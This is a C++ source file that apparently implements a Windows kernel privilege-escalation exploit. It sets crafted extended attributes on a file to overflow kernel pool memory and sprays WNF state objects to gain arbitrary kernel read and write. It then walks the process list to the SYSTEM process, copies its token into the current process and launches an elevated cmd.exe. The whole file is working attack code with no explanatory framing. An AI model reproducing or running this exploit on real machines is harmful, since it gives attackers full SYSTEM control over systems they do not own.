// ConsoleApplication11.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include <Windows.h>
#include "nt.h"
#include <sddl.h>

#include <localUtil.h>

__ZwQueryEaFile NtQueryEaFile = NULL;
__ZwSetEaFile NtSetEaFile = NULL;
__NtCreateWnfStateName NtCreateWnfStateName = NULL;
__NtUpdateWnfStateData NtUpdateWnfStateData = NULL;
__NtQueryWnfStateData NtQueryWnfStateData = NULL;
__NtDeleteWnfStateData NtDeleteWnfStateData = NULL;
__NtDeleteWnfStateName NtDeleteWnfStateName = NULL;
WNF_STATE_NAME StateNames[SPRAY_COUNT] = {0};

UINT64 OVER_STATENAME = 0;

int initNtDll()
{
	int result = -1;
	HMODULE hNtDll = NULL;

	hNtDll = LoadLibrary("ntdll.dll");
	SAFE_PAIL(hNtDll == NULL, "load ntdll failed!\r\n");

	NtQueryEaFile = (__ZwQueryEaFile)GetProcAddress(hNtDll, "NtQueryEaFile");
	SAFE_BAIL(NtQueryEaFile == 0);
	NtSetEaFile = (__ZwSetEaFile)GetProcAddress(hNtDll, "ZwSetEaFile");
	SAFE_BAIL(NtSetEaFile == 0);
	NtCreateWnfStateName = (__NtCreateWnfStateName)GetProcAddress(hNtDll, "NtCreateWnfStateName");
	SAFE_BAIL(NtCreateWnfStateName == 0);
	NtUpdateWnfStateData = (__NtUpdateWnfStateData)GetProcAddress(hNtDll, "NtUpdateWnfStateData");
	SAFE_BAIL(NtUpdateWnfStateData == 0);
	NtQueryWnfStateData = (__NtQueryWnfStateData)GetProcAddress(hNtDll, "NtQueryWnfStateData");
	SAFE_BAIL(NtQueryWnfStateData == 0);
	NtDeleteWnfStateData = (__NtDeleteWnfStateData)GetProcAddress(hNtDll, "NtDeleteWnfStateData");
	SAFE_BAIL(NtDeleteWnfStateData == 0);
	NtDeleteWnfStateName = (__NtDeleteWnfStateName)GetProcAddress(hNtDll, "NtDeleteWnfStateName");
	SAFE_BAIL(NtDeleteWnfStateName == 0);
	// printf("not found  functions\r\n");

	result = 0;
fail:
	SAFE_FREELIB(hNtDll);
	return result;
}

int tiggerLeak()
{
	PFILE_GET_EA_INFORMATION EaList = NULL;
	PFILE_GET_EA_INFORMATION EaListCP = NULL;
	PVOID eaData = NULL;
	DWORD dwNumberOfBytesWritten = 0;
	UCHAR payLoad[PAYLOAD_SIZE] = {0};
	PFILE_FULL_EA_INFORMATION curEa = NULL;
	HANDLE hFile = INVALID_HANDLE_VALUE;
	IO_STATUS_BLOCK eaStatus = {0};
	NTSTATUS rc;
	PWNF_STATE_NAME_REGISTRATION PStateNameInfo = NULL;
	PISECURITY_DESCRIPTOR pSecurity = NULL;
	PUCHAR pd = NULL;
	PUCHAR StateDataLock = NULL;
	PUINT64 StateData = NULL;
	PUINT64 StateName = NULL;
	PUINT64 parent = NULL;
	PUINT AllocatedSize = NULL;
	PUINT DataSize = NULL;
	int state = -1;

	hFile = CreateFileA("payload",
						GENERIC_READ | GENERIC_WRITE,
						FILE_SHARE_READ | FILE_SHARE_WRITE,
						NULL,
						CREATE_ALWAYS,
						FILE_ATTRIBUTE_NORMAL,
						NULL);

	SAFE_PAIL(hFile == INVALID_HANDLE_VALUE, "create the file failed\r\n");
	WriteFile(hFile, "This files has an optional .COMMENTS EA\n",
			  strlen("This files has an optional .COMMENTS EA\n"),
			  &dwNumberOfBytesWritten, NULL);

	curEa = (PFILE_FULL_EA_INFORMATION)payLoad;
	curEa->Flags = 0;
	curEa->EaNameLength = TIGGER_EA_NAME_LENGTH;
	curEa->EaValueLength = TIGGER_EA_VALUE_LENGTH;
	// align 4。
	curEa->NextEntryOffset = (curEa->EaNameLength + curEa->EaValueLength + 3 + 9) & (~3);

	memcpy(curEa->EaName, TIGGER_EA_NAME, TIGGER_EA_NAME_LENGTH);
	RtlFillMemory(curEa->EaName + curEa->EaNameLength + 1, TIGGER_EA_VALUE_LENGTH, 'A');

	curEa = (PFILE_FULL_EA_INFORMATION)((PUCHAR)curEa + curEa->NextEntryOffset);
	curEa->NextEntryOffset = 0;
	curEa->Flags = 0;
	curEa->EaNameLength = OVER_EA_NAME_LENGTH;
	curEa->EaValueLength = OVER_EA_VALUE_LENGTH;

	memcpy(curEa->EaName, OVER_EA_NAME, OVER_EA_NAME_LENGTH);
	RtlFillMemory(curEa->EaName + curEa->EaNameLength + 1, OVER_EA_VALUE_LENGTH, 0);
	pd = (PUCHAR)(curEa);

	AllocatedSize = (PUINT)(pd + 0x4 + 0x10);
	DataSize = (PUINT)(pd + 0x8 + 0x10);
	*AllocatedSize = OVER_STATEDATA_LENGTH;
	*DataSize = OVER_STATEDATA_LENGTH;

	rc = NtSetEaFile(hFile, &eaStatus, payLoad, sizeof(payLoad));
	SAFE_PAIL(rc != 0, "NtSetEaFile failed error code is %x\r\n", rc);

	eaData = malloc(sizeof(payLoad));
	SAFE_BAIL(eaData == NULL);

	memset(eaData, 0, sizeof(payLoad));

	EaList = (PFILE_GET_EA_INFORMATION)malloc(100);
	SAFE_BAIL(EaList == NULL);

	EaListCP = EaList;
	memset(EaList, 0, 100);
	memcpy(EaList->EaName, ".PA", strlen(".PA"));

	EaList->EaNameLength = (UCHAR)strlen(".PA");
	EaList->NextEntryOffset = 12; // align 4
	EaList = (PFILE_GET_EA_INFORMATION)((PUCHAR)EaList + 12);

	memcpy(EaList->EaName, ".PBB", strlen(".PBB"));
	EaList->EaNameLength = (UCHAR)strlen(".PBB");
	EaList->NextEntryOffset = 0;

	rc = NtQueryEaFile(hFile, &eaStatus, eaData, KERNAL_ALLOC_SIZE, FALSE, EaListCP, 100, 0, TRUE);
	state = 0;

fail:
	SAFE_HCLOSE(hFile);
	SAFE_FREE(EaList);
	SAFE_FREE(eaData);
	SAFE_FREE(pSecurity);

	return state;
}

int HeapSpray()
{
	int result = -1;
	NTSTATUS state = 0;
	PSECURITY_DESCRIPTOR pSD = nullptr;
	BYTE upData[0xa0] = {0};

	RtlFillMemory(upData, sizeof(upData), 'C');
	SAFE_BAIL(!ConvertStringSecurityDescriptorToSecurityDescriptor("",
																   SDDL_REVISION_1, &pSD, nullptr));

	for (int i = 0; i < SPRAY_COUNT; i++)
	{
		state = NtCreateWnfStateName(&StateNames[i], WnfTemporaryStateName, WnfDataScopeUser, FALSE, NULL, OVER_STATEDATA_LENGTH, pSD);
		SAFE_BAIL(state != 0);
	}

	for (int i = 1; i < SPRAY_COUNT; i += 2)
	{
		state = NtDeleteWnfStateName(&StateNames[i]);
		SAFE_BAIL(state != 0);

		StateNames[i].Data[0] = 0;
		StateNames[i].Data[1] = 0;

		state = NtUpdateWnfStateData((PWNF_STATE_NAME)&StateNames[i - 1], &upData, 0xa0, NULL, NULL, NULL, 0);
		SAFE_BAIL(state != 0);
	}

	for (int i = 0; i < SPRAY_COUNT; i += 4)
	{
		NtDeleteWnfStateData(&StateNames[i], NULL);
		state = NtDeleteWnfStateName(&StateNames[i]);
		SAFE_BAIL(state != 0);

		StateNames[i].Data[0] = 0;
		StateNames[i].Data[1] = 0;
	}

	result = 0;
fail:
	SAFE_LFREE(pSD);

	return 0;
}

int tigger(UINT64 StateName)
{
	NTSTATUS state = 0;
	UINT64 name = StateName;
	BYTE upData[0x74] = {0};

	RtlFillMemory(upData, sizeof(upData), 'A');
	name ^= STATE_NAME_MASK;
	state = NtUpdateWnfStateData((PWNF_STATE_NAME)&name, &upData, 0x70, NULL, NULL, NULL, 0);
	return state;
}

int OverStateData(PWNF_STATE_NAME StateName, PUCHAR Buff)
{
	NTSTATUS state = NtUpdateWnfStateData(StateName, (const void *)Buff, OVER_STATEDATA_LENGTH, NULL, NULL, NULL, 0);

	return state;
}

NTSTATUS GetOverStateData(UINT64 StateName, PUCHAR Buff, PULONG size)
{
	WNF_CHANGE_STAMP Stamp;
	ULONG BufferSize = *size;
	UINT64 name = StateName;
	NTSTATUS state = 0;

	name ^= STATE_NAME_MASK;
	state = NtQueryWnfStateData((PWNF_STATE_NAME)&name, NULL, NULL, &Stamp, Buff, &BufferSize);
	SAFE_PAIL(state != 0, __FUNCTION__ "failed size: %d state: %x\r\n", BufferSize, state);

	*size = BufferSize;
fail:
	return state;
}

UINT64 GetProcessEprocess(UINT64 StateName, PUINT64 pid, UINT pidOffset = 0x120, UINT eprocessOffset = 0x128)
{

	UCHAR Buff[0x3000] = {0};
	ULONG BufferSize = 0x3000;
	int state = 0;
	UINT64 result = 0;

	state = GetOverStateData(StateName, Buff, &BufferSize);
	SAFE_PAIL(state != 0, __FUNCTION__ "filed %x\r\n", state);

	// idle
	*pid = 0;
	SAFE_BAIL(BufferSize == 0)

	*pid = *((PUINT64)(Buff + pidOffset));
	result = *((PUINT64)(Buff + eprocessOffset));
fail:
	return result;
}

int GetProcessName(UINT64 StateName, PCHAR name)
{
	int result = -1;
	UCHAR Buff[0x5000] = {0};
	ULONG BufferSize = 0x5000;
	int state = 0;

	state = GetOverStateData(StateName, Buff, &BufferSize);
	SAFE_PAIL(state != 0, __FUNCTION__ "filed %x\r\n", state);
	memcpy(name, Buff, 0x100 - 1);

	result = 0;
fail:
	return result;
}

UINT64 GetProcessToken(UINT64 StateName)
{
	UCHAR Buff[0x5000] = {0};
	ULONG BufferSize = 0x5000;
	int state = 0;
	UINT64 result = -1;

	state = GetOverStateData(StateName, Buff, &BufferSize);
	SAFE_PAIL(state != 0, __FUNCTION__ " filed %x\r\n", state)

	result = *(PUINT64)(Buff + 0x30);
fail:
	return result;
}

NTSTATUS EnumProcessEprocess(PWNF_STATE_NAME StateName, PUCHAR Buff)
{
	UINT64 systemEProcess = 0;
	BOOL Isexist = FALSE;
	NTSTATUS state = -1;
	UINT64 pid = 0;
	UINT64 next = 0;
	NTSTATUS result = -1;
	STARTUPINFO StartupInfo = {0};
	PROCESS_INFORMATION ProcessInformation = {0};
	UINT64 eProcess = 0;
	UCHAR tokenBuff[0x5000] = {0};
	ULONG tokenBufferSize = 0x5000;
	UINT64 name = 0;
	UINT64 entry = 0;
	PWNF_NAME_INSTANCE NameIns = 0;
	UINT64 token = 0;

	for (int i = 0; i < SPRAY_COUNT; ++i)
	{
		if (*(PUINT64)StateName == *((PUINT64)&StateNames[i]))
		{
			Isexist = TRUE;
		}
	}
	SAFE_PAIL(Isexist == FALSE, "the wnf obj is deleted!!!\r\n");

	NameIns = (PWNF_NAME_INSTANCE)(Buff + 0xa0 + 0x10);
	eProcess = (UINT64)NameIns->CreatorProcess;
	SAFE_BAIL(eProcess == 0)

	entry = (UINT64)(eProcess + PROCESS_ID_OFFSET);
	for (;;)
	{
		NameIns->StateData = (_WNF_STATE_DATA *)(entry);
		state = OverStateData(StateName, Buff);
		SAFE_BAIL(state != 0)

		pid = 0;
		next = GetProcessEprocess(*(PULONGLONG) & (NameIns->StateName), &pid);

		// handle idle process
		if (pid == 0)
		{
			entry = entry + 0x269 - PROCESS_ID_OFFSET;

			NameIns->StateData = (_WNF_STATE_DATA *)(entry);
			state = OverStateData(StateName, Buff);
			SAFE_BAIL(state != 0);

			next = GetProcessEprocess(*(PULONGLONG) & (NameIns->StateName), &pid, 0x6f, 0x77);
			printf("EPROCESS: %llx PID: %lld\r\n", entry - 0x269, pid);
		}
		else
		{
			printf("EPROCESS: %llx PID: %lld\r\n", entry - PROCESS_ID_OFFSET, pid);
		}

		if (pid == 4)
		{
			printf("found system process\r\n");
			systemEProcess = entry - PROCESS_ID_OFFSET;
			break;
		}

		SAFE_BREAK(next == 0);
		entry = next - PROCESS_LIST_OFFSET + PROCESS_ID_OFFSET;
	}

	if (systemEProcess != 0)
	{
		NameIns->StateData = (_WNF_STATE_DATA *)(systemEProcess + TOKEN_OFFSET);
		state = OverStateData(StateName, Buff);
		SAFE_BAIL(state != 0);
		token = GetProcessToken(*(PULONGLONG) & (NameIns->StateName));

		RtlZeroMemory(tokenBuff, sizeof(tokenBuff));
		tokenBufferSize = 0x5000;

		NameIns->StateData = (_WNF_STATE_DATA *)(eProcess + TOKEN_OFFSET);
		state = OverStateData(StateName, Buff);
		SAFE_BAIL(state != 0);

		state = GetOverStateData(*(PULONGLONG) & (NameIns->StateName), tokenBuff, &tokenBufferSize);
		SAFE_PAIL(state != 0, " filed %x %d\r\n", state, __LINE__);

		*(PUINT64)(tokenBuff + 0x30) = token;
		NameIns->StateData = (_WNF_STATE_DATA *)(eProcess + TOKEN_OFFSET + 4);
		state = OverStateData(StateName, Buff);
		SAFE_PAIL(state != 0, " filed %x %d\r\n", state, __LINE__);

		name = *(PULONGLONG) & (NameIns->StateName);
		name ^= STATE_NAME_MASK;

		state = NtUpdateWnfStateData((PWNF_STATE_NAME)(&name), tokenBuff + 4, 0x100, NULL, NULL, NULL, 0);
		SAFE_PAIL(state != 0, "re token failed state: %x\r\n", state);

		SAFE_PAIL(!CreateProcess("C:\\Windows\\System32\\cmd.exe",
								 NULL,
								 NULL,
								 NULL,
								 FALSE,
								 CREATE_NEW_CONSOLE,
								 NULL,
								 NULL,
								 &StartupInfo,
								 &ProcessInformation),
				  "[-] Failed to Create Target Process: 0x%X\n", GetLastError());

		WaitForSingleObject(ProcessInformation.hProcess, INFINITE);
	}

	result = 0;
fail:
	return result;
}

int main()
{
	BOOL IsSuccess = FALSE;
	UINT Count = 0;
	PVOID pSelfEprocess = NULL;

	SAFE_PAIL(initNtDll() != 0, "initNtDll filed!\r\n");
	SAFE_PAIL(HeapSpray() != 0, "HeapSpray filed!\r\n");

RE_TRY:
	SAFE_PAIL(Count++ >= 1000, "exp  filed!\r\n");
	SAFE_PAIL(tiggerLeak() != 0, "tigger leak filed!\r\n");

	for (int i = 0; i < SPRAY_COUNT; i += 2)
	{
		WNF_CHANGE_STAMP Stamp;
		ULONG BufferSize = 0xa0;
		UCHAR Buff[OVER_STATEDATA_LENGTH] = {0};
		SAFE_CONT(StateNames[i].Data[0] == 0 && StateNames[i].Data[1] == 0);
		NTSTATUS state = NtQueryWnfStateData(&StateNames[i], NULL, NULL, &Stamp, &Buff, &BufferSize);
		if (state == 0xc0000023)
		{
			BufferSize = OVER_STATEDATA_LENGTH;
			state = NtQueryWnfStateData(&StateNames[i], NULL, NULL, &Stamp, &Buff, &BufferSize);
			if (state == 0)
			{
				PWNF_NAME_INSTANCE NameIns = (PWNF_NAME_INSTANCE)(Buff + 0xa0 + 0x10);

				if (NameIns->Header.NodeByteSize == 0xa8 &&
					NameIns->Header.NodeTypeCode == 0x903 &&
					NameIns->RunRef.Ptr == NULL)
				{
					if (EnumProcessEprocess(&StateNames[i], Buff) == 0)
					{
						IsSuccess = TRUE;
					}
				}
			}
		}
	}

	if (IsSuccess == FALSE)
		goto RE_TRY;

	IsSuccess = !IsSuccess;

fail:
	system("pause");
	return 0;
}
